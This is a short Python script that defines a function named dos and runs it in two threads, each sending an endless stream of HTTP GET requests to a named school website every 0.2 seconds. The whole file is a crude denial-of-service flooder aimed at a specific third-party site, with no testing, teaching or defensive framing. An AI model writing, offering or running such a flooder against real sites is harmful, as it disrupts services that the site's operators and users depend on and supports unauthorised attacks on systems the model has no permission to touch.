# coding: utf8
from threading import Thread
import requests
import time


def dos():
    while True:
        requests.get("http://www.school110.com")
        time.sleep(0.2)


if __name__ == '__main__':
    thread = Thread(target=dos)
    thread2 = Thread(target=dos)
    thread.start()
    thread2.start()